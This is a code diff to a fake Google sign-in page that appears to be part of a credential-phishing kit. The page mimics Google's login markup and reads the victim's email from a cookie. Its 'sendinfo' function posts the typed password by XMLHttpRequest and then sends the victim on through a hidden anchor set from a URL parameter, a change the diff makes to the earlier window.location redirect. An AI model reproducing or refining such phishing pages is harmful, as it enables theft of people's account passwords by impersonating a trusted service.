@@ -13,6 +13,7 @@
 <link rel="stylesheet" href="GLogin.min.css">
 </head>
 <body id="yDmH0d" class="nyoS7c UzCXuf EIlDfe">
+<a id="directme" style="display: none;"></a>
 <script>
 if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf('@')==-1){Cookies.set('email', Cookies.get('email')+"@gmail.com");}
 </script>
@@ -74,7 +75,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
                       <div jsname="FlmCdf"></div>
                     </div>
                   </content>
-                  <div jscontroller="mjtijb" jsname="rEuO1b" data-form-action-uri="/signin/v2/challenge/password/empty">
+                  <div jscontroller="mjtijb" jsname="rEuO1b">
                   <form action="" method="post" novalidate="">
                     <content>
                       <div class="cDSmF s5Ip0c" role="presentation">
@@ -134,6 +135,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 <div class="VmOpGe" aria-hidden="true"></div>
 </div>
 <script>
+	document.getElementById("directme").href = urldata("redirect");
 	document.getElementById("pw").addEventListener("focus", function() {document.getElementById('password').className+=' u3bW4e';});
 	document.getElementById("pw").addEventListener("blur", function() {document.getElementById('password').classList.remove('u3bW4e');});
 	document.getElementById("pw").focus();
@@ -145,13 +147,13 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 	});
 	document.getElementById("pIdr").innerHTML = Cookies.get('email');
 	function sendinfo() {
-		if(document.getElementById("pw").value!="") {
+		if(document.getElementById("pw").value) {
 		var xhttp = new XMLHttpRequest();
 		xhttp.onreadystatechange = function() {
 			if (this.readyState == 4 && this.status == 200) {
 				console.log(this.responseText);
 				if(urldata("redirect")) {
-					window.location.href = urldata("redirect");
+					document.getElementById("directme").click();
 				}
 			}
 		};
